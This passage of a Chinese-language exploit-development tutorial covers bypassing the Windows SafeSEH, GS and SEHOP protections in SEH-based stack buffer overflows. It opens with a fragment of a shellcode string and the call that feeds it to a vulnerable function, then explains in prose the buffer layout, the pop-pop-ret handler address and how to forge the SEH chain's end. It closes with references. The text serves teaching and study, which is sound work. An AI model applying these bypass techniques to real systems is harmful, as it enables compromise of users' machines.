"\xc7\x93\xbf\x77"     
"\xFF\xD0";   //shellcode



    GetInput(shellcode,buf2);
    return 0;
}

```

在特定情况下,假如只有应用程序没有启用safeseh保护,但却启用了gs,我们依然可以绕过

前面说布置的缓冲区数据格式: buf + nseh + seh handle + shellcode,在程序内寻找一个ppt地址写在seh handle位置,这个位置会包含00字符(基址0040xxxx),例子中用strcpy函数溢出遇到\x00会截断,也就是说假如要用程序内的ppt地址,shellcode就得布置在seh handle之前,刚好可以利用当前缓冲区

布置如下: shellcode(60字节) + nseh + ppt. ppt会首先跳到nseh位置处的4字节指令,再确定缓冲区的起始位置, nseh4字节指令跳转过去执行即可绕过safeseh.

0x0B 绕过sehop
============

* * *

像是拼人品的“没有gs”、“有虚函数”等绕过方式暂且不提,sehop触发异常之前,会检测seh链,没有sehop之前,我们通常是直接覆盖nseh和handle

![test](http://drops.javaweb.org/uploads/images/08547d898b3f4b420387f7c60e633022402fa312.jpg)

sehop检测链表是否断掉,最后一个节点handle是否指向ntdll!FinalExceptHandler,nseh是否指向0xffffffff,也就是说,将ntdll!FinalExceptHandler的地址和0xffffffff写入到任意节点A,并保证前一个节点的nseh指向A的seh handle即可欺骗sehop

![test](http://drops.javaweb.org/uploads/images/d03313251385ad7013014a1d8db5138386c9615c.jpg)

前面讲过覆盖的handle地址为ppt,ppt指向nseh的数据,这里就是4字节对齐的原因了,nseh既要指向下一个节点,又要能保证跳到前面的缓冲区

![test](http://drops.javaweb.org/uploads/images/7d8c80ea2627eb6b572e2602cae835e5ed9b4771.jpg)

这里就是精髓了,4字节对齐,nseh的地址既作为指针又作为指令,跳转到缓冲区数据又不能超过4字节.用je来跳,je会根据z标志位是否被设置来判断是否满足条件,指令运算为0设置z,即可将eip控制到缓冲区起始位置,寻找这样的指令很容易,例如xor eax,eax,所以seh handle要为x p p t.

为防止handle的值也作为了指令执行,所以缓冲区内应该有跳过seh的指令,如图:

![test](http://drops.javaweb.org/uploads/images/9eb0bfe08aac337c7f669dac9856c015c1283234.jpg)

既保证了seh链表的完整,又成功执行的shellcode.了解了具体结构 写完整的shellcode就不是难事了:)

但此种方法只适应于未启用aslr的情况,因为ntdll!FinalExceptHandler的高位地址随机,seh的特性,在不破坏链表的情况下, 只能利用内存信息泄漏来确定ntdll!FinalExceptHandler的地址.

0x0C 参考文献
=========

* * *

*   shellcoder编程揭秘
*   0day安全软件漏洞分析技术
*   暗战亮剑-软件漏洞发掘与安全防范实战
*   深入理解计算机系统

感谢四书作者的无私奉献.

*   《oday2 软件漏洞分析技术》
*   《shellcoder编程揭秘》
*   《exploit编写教程》
*   [http://bbs.pediy.com/showthread.php?t=104707](http://bbs.pediy.com/showthread.php?t=104707)
*   [https://dl.packetstormsecurity.net/papers/bypass/SafeSEH_SEHOP_principles.pdf](https://dl.packetstormsecurity.net/papers/bypass/SafeSEH_SEHOP_principles.pdf)
*   [http://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf](http://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf)

笔记性质的文章,才疏学浅,如有纰漏欢迎指正